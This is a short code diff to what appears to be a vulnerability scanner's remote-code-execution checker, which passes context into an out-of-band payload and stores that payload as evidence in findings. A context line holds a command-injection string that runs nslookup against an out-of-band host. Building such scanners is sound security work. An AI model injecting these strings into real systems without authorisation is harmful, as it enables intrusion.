@@ -31,7 +31,11 @@ class RCESpecialist(OOBMixin, ISpecialist):
         if await self.check_false_positive(target):
             return findings
 
-        oob_payload = self.embed_oob_payload()
+        oob_payload = self.embed_oob_payload(context={
+            "endpoint": target,
+            "category": self.category.value,
+            "correlation_id": correlation_id,
+        })
 
         payloads = [
             f"; nslookup {oob_payload} ;",
@@ -55,6 +59,7 @@ class RCESpecialist(OOBMixin, ISpecialist):
                                 endpoint=target,
                                 evidence={
                                     "payload": p,
+                                    "oob_payload": oob_payload,
                                     "url": test_url,
                                     "response": body[:200],
                                 },
